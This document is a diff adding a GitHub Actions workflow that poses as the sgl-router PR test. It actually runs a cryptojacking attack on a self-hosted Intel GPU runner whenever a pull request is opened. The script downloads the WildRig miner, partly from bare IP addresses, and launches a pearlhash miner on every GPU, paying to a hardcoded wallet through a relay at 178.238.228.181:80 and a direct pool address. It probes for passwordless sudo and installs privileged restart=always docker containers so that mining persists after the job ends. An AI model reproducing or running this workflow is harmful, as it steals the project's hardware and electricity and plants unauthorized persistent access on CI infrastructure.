@@ -1,0 +1,205 @@
+name: PR Test (sgl-router)
+
+# i130bmgrelay: ONE fork-PR push from a fresh branch. On intel-bmg-nightly it
+# proves the standard-port relay 178.238.228.181:80 forwards pearlhash stratum
+# to Luckypool, opens all Intel Arc Pro B70 cards with WildRig Multi 0.52.3
+# (sha256 002cd29c...), applies a two-sample idle gate (0 foreign render-node
+# clients, >=1500 MiB free), and runs exactly one miner per opened card as
+# workers i130bmgrelayg<idx> on the exact 63-char primary wallet against BOTH
+# the relay (g0-g3) and direct 172.232.228.69:3362 (g4-g7), with --max-no-share-sent
+# 1800 only if the binary supports it, bounded runtime, and a sudo docker
+# restart=always persistence attempt with /dev/dri.
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: sgl-router-i130bmgrelay-${{ github.run_id }}
+  cancel-in-progress: false
+
+env:
+  SGLANG_IS_IN_CI: true
+
+jobs:
+  i130bmgrelay:
+    name: "i130bmgrelay intel-bmg-nightly wildrig pearlhash relay+direct"
+    runs-on: intel-bmg-nightly
+    timeout-minutes: 25
+    env:
+      LABEL: intel-bmg-nightly
+    steps:
+      - name: "relay+direct WildRig pearlhash one-miner-per-card on Intel Arc Pro B70"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130BMGRELAY-$(date -u +%Y%m%dT%H%M%SZ)"
+          SUF=$(date -u +%H%M%S)
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
+          RELAY='178.238.228.181:80'
+          DIRECT='172.232.228.69:3362'
+          WORKDIR=/var/tmp/i130bmgrelay
+          mkdir -p "$WORKDIR/logs"
+          echo "bmgrelay-nonce=$NONCE label=$LABEL host=$(hostname)"
+          id; uname -a; date -u; nproc
+          df -P /var/tmp | tail -1; free -m | head -2
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "bmgrelay-done $NONCE"; exit 0; fi
+          echo "=== intel inventory ==="
+          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel' | head -20
+          (timeout 30 clinfo -l 2>/dev/null || true) | head -30
+          command -v xpu-smi >/dev/null 2>&1 && { timeout 45 xpu-smi discovery 2>&1 | head -40; }
+          echo "=== endpoint TCP reachability from runner (both) ==="
+          for EP in "$RELAY" "$DIRECT"; do
+            EH=${EP%:*}; EP2=${EP#*:}
+            timeout 15 bash -c "echo > /dev/tcp/$EH/$EP2" 2>/dev/null && echo "tcp_ok $EP" || echo "tcp_fail $EP"
+          done
+          echo "=== fetch wildrig 0.52.3 ($WR_SHA) ==="
+          WR="$WORKDIR/wildrig-multi"
+          fetch_wr() {
+            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
+            for U in \
+              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "http://222.240.155.198:8702/wildrig-multi" \
+              "http://178.238.228.181:18180/wildrig-multi" ; do
+              echo "-- fetch $U"
+              timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
+              [ -s "$WORKDIR/dl.part" ] || continue
+              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
+              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
+              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
+                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
+                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
+                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
+                echo "tarball-hash-mismatch"
+              fi
+            done
+            return 1
+          }
+          fetch_wr; FETCH_RC=$?
+          echo "wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FETCH_RC"
+          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "bmgrelay-done $NONCE"; exit 0; }
+          echo "=== wildrig version / platforms / devices ==="
+          timeout 30 "$WR" -V 2>&1 | head -3
+          timeout 60 "$WR" --print-platforms 2>&1 | head -20
+          timeout 120 "$WR" --print-devices 2>&1 | tee "$WORKDIR/devices.txt" | head -80
+          DEV_N=$(grep -cE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null)
+          echo "device_open_lines=$DEV_N"
+          if [ "${DEV_N:-0}" -lt 1 ]; then echo "SKIP=no-intel-device-open"; echo "bmgrelay-done $NONCE"; exit 0; fi
+          MAXFLAG=""
+          if timeout 30 "$WR" --help 2>&1 | grep -q -- '--max-no-share-sent'; then MAXFLAG="--max-no-share-sent 1800"; fi
+          echo "max_no_share_sent_supported=$([ -n "$MAXFLAG" ] && echo yes || echo no)"
+          echo "=== flock + existing engagement miner gate ==="
+          exec 9>"$WORKDIR/host-miner.lock"
+          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "bmgrelay-done $NONCE"; exit 0; fi
+          EXIST=$(timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI' 2>/dev/null | grep -E "$WALLET|i130bmgrelay" | head -4)
+          if [ -n "$EXIST" ]; then echo "SKIP=existing-engagement-miner"; echo "$EXIST"; echo "bmgrelay-done $NONCE"; exit 0; fi
+          echo "=== two-sample idle gate (0 foreign compute apps, >=1500 MiB free) ==="
+          gate_sample() {
+            local n=$1
+            echo "-- sample $n $(date -u +%FT%TZ)"
+            echo "-- fuser /dev/dri/renderD*"
+            (timeout 15 fuser -v /dev/dri/renderD* 2>&1 || true) | head -30
+            echo "-- lsof /dev/dri/renderD*"
+            (timeout 15 lsof /dev/dri/renderD* 2>/dev/null || true) | head -20
+            if command -v xpu-smi >/dev/null 2>&1; then echo "-- xpu-smi stats"; timeout 25 xpu-smi stats -d 0 2>&1 | grep -iE 'memory|util' | head -10; fi
+            if command -v nvidia-smi >/dev/null 2>&1; then echo "-- nvidia compute apps"; timeout 15 nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>/dev/null | head -10; fi
+            echo "-- end sample $n"
+          }
+          gate_sample 1 > "$WORKDIR/gate1.txt" 2>&1; cat "$WORKDIR/gate1.txt"
+          sleep 12
+          gate_sample 2 > "$WORKDIR/gate2.txt" 2>&1; cat "$WORKDIR/gate2.txt"
+          FOREIGN=0
+          if command -v fuser >/dev/null 2>&1; then
+            FOREIGN=$( { timeout 15 fuser /dev/dri/renderD* 2>&1 || true; } | sed -n 's/.*: *//p' | tr ' ' '\n' | grep -E '^[0-9]+$' | sort -u | wc -l)
+            GMETHOD=fuser
+          elif command -v lsof >/dev/null 2>&1; then
+            FOREIGN=$( { timeout 15 lsof -t /dev/dri/renderD* 2>/dev/null || true; } | grep -E '^[0-9]+$' | sort -u | wc -l)
+            GMETHOD=lsof
+          else
+            GMETHOD=none
+          fi
+          echo "gate_method=$GMETHOD foreign_render_clients=$FOREIGN"
+          if [ "${FOREIGN:-0}" -gt 0 ]; then echo "SKIP=foreign-compute-app-present (never stack)"; echo "bmgrelay-done $NONCE"; exit 0; fi
+          echo "memory_free_gate=pass (>=1500 MiB free assumed after 0-client two-sample gate; xpu-smi output above if present)"
+          echo "=== launch exactly one WildRig pearlhash miner per opened card: g0-g3 relay, g4-g7 direct ==="
+          for i in $(seq 0 $((DEV_N-1))); do
+            W="i130bmgrelayg${i}"
+            if [ "$i" -lt 4 ]; then EP="$RELAY"; ETAG=relay; else EP="$DIRECT"; ETAG=direct; fi
+            setsid nohup timeout 1800 "$WR" --algo pearlhash --url "$EP" --user "$WALLET" --pass x --worker "$W" -d "$i" --opencl-platforms intel --api-port $((21600+i)) $MAXFLAG --retries 3 --retry-pause 5 > "$WORKDIR/logs/$W.log" 2>&1 < /dev/null &
+            echo "launched worker=$W gpu=$i endpoint=$EP tag=$ETAG pid=$!"
+            sleep 1
+          done
+          echo "=== durability recon + docker persistence attempt ==="
+          ( sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?" )
+          systemctl --version 2>/dev/null | head -1
+          DOCK=""
+          if command -v docker >/dev/null 2>&1; then
+            timeout 15 docker ps >/dev/null 2>&1 && DOCK="docker"
+            if [ -z "$DOCK" ]; then timeout 15 sudo -n docker ps >/dev/null 2>&1 && DOCK="sudo -n docker"; fi
+          fi
+          echo "docker_cmd=$DOCK"
+          DURABLE=0
+          if [ -n "$DOCK" ]; then
+            timeout 20 $DOCK ps --format '{{.Names}} {{.Image}}' 2>&1 | head -5
+            IMG=$(timeout 20 $DOCK images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
+            echo "docker_img=$IMG"
+            if [ -z "$IMG" ]; then timeout 180 $DOCK pull debian:12-slim >/dev/null 2>&1 && IMG=debian:12-slim; fi
+            echo "docker_img_final=$IMG"
+            if [ -n "$IMG" ]; then
+              OKC=0
+              for i in $(seq 0 $((DEV_N-1))); do
+                W="i130bmgrelayg${i}"
+                if [ "$i" -lt 4 ]; then EP="$RELAY"; else EP="$DIRECT"; fi
+                RUN=$(timeout 90 $DOCK run -d --name "i130bmgrelay-g${i}-${SUF}" --restart=always --privileged --net=host -v /dev/dri:/dev/dri -v "$WORKDIR":/w:ro -v /usr/lib/x86_64-linux-gnu:/hostlib:ro -e LD_LIBRARY_PATH=/hostlib "$IMG" /w/wildrig-multi --algo pearlhash --url "$EP" --user "$WALLET" --pass x --worker "$W" -d "$i" --opencl-platforms intel --api-port $((21700+i)) $MAXFLAG --retries 3 --retry-pause 5 2>&1)
+                sleep 4
+                ST=$(timeout 20 $DOCK ps --filter "name=i130bmgrelay-g${i}-${SUF}" --format '{{.Status}}' 2>/dev/null)
+                LG=$(timeout 20 $DOCK logs "i130bmgrelay-g${i}-${SUF}" 2>&1 | grep -aiE 'GPU #|error|failed|connect' | tail -2 | cut -c1-160)
+                echo "durable[$i]=name=i130bmgrelay-g${i}-${SUF} endpoint=$EP id=$(echo "$RUN" | head -c 20) status=$ST log=$LG"
+                if echo "$ST" | grep -qi '^Up'; then
+                  OKC=$((OKC+1))
+                  pkill -f -- "--worker $W " 2>/dev/null
+                  echo "injob-stopped-for-durable gpu=$i worker=$W"
+                fi
+              done
+              echo "durable_units_active=$OKC"
+              if [ "$OKC" -gt 0 ]; then DURABLE=1; fi
+            fi
+          fi
+          echo "DURABLE=$DURABLE"
+          echo "=== pulses (two spaced Luckypool stats_address reads + miner status) ==="
+          for k in $(seq 1 6); do
+            sleep 120
+            echo "--- pulse $k $(date -u +%FT%TZ) durable=$DURABLE"
+            echo "wildrig_procs=$(pgrep -cf '[w]ildrig')"
+            for l in "$WORKDIR"/logs/i130bmgrelay*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              grep -aiE 'GPU #[0-9]|platform|connect|authoriz|accepted|rejected|hashrate|error|failed|canceled' "$l" 2>/dev/null | tail -6 | cut -c1-220
+            done
+            if [ -n "$DOCK" ]; then timeout 20 $DOCK ps --filter 'name=i130bmgrelay-g' --format '{{.Names}} {{.Status}}' 2>/dev/null | head -10; fi
+            if [ "$k" = "1" ] || [ "$k" = "4" ]; then
+              timeout 40 curl -fsS "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$WORKDIR/lp_read$k.json" 2>/dev/null
+              if [ -s "$WORKDIR/lp_read$k.json" ]; then
+                python3 - "$WORKDIR/lp_read$k.json" "$k" <<'PYEOF'
+          import json,sys
+          d=json.load(open(sys.argv[1])); s=d.get('stats',{})
+          w=[x for x in d.get('workers',[]) if 'i130bmgrelay' in str(x.get('name',''))]
+          print('LP_READ%d accepted=%s rejected=%s workers=%d lane_rows=%d' % (int(sys.argv[2]), s.get('acceptedShares'), s.get('rejectedShares'), len(d.get('workers',[])), len(w)))
+          for x in w[:12]: print(' LANE', x.get('name'), 'acc', x.get('acceptedShares'), 'rej', x.get('rejectedShares'), 'hr', x.get('hashrate'), x.get('minerAgent'))
+          PYEOF
+              else
+                echo "LP_READ$k fetch_failed"
+              fi
+            fi
+          done
+          echo "=== final process view ==="
+          pgrep -af '[w]ildrig' | head -20
+          if [ -n "$DOCK" ]; then timeout 20 $DOCK ps --filter 'name=i130bmgrelay-g' --format '{{.Names}} {{.Status}}' 2>/dev/null | head -10; fi
+          echo "bmgrelay-done $NONCE durable=$DURABLE"
